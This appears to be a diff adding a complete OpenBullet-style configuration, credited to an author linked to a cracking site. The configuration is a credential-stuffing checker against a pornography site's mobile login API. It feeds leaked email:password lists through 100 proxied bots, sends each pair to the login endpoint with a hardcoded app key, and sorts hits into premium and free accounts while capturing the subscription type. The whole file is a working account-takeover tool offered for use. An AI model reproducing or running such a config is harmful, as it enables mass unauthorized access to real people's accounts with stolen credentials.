@@ -1,0 +1,39 @@
+[SETTINGS]
+{
+  "Name": "PornHub",
+  "SuggestedBots": 100,
+  "LastModified": "2019-02-23T20:22:11.9664194+01:00",
+  "AdditionalInfo": "By Kirikoo#2379",
+  "Author": "Kirikoo#2379 | www.black-gen.pw",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserMail",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#REQUETE_LOGIN REQUEST GET "https://api.pornhub.com/api_android_v3/login?appKey=72d2512a43364263e9d94f0f73&uuid=ba0e1cfdd2a29db5&username=<USER>&password=<PASS>" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "message\":\"INVALID USERNAME OR PASSWORD\"}}" 
+  KEYCHAIN Success OR 
+    KEY "\"userType\":\"Premium\",\"" 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "\"userType\":\"Free\",\"" 
+#Capture_Abo PARSE "<SOURCE>" LR "pe\":\"" "\",\"e" Recursive=FALSE -> CAP "ABO" "" "" 
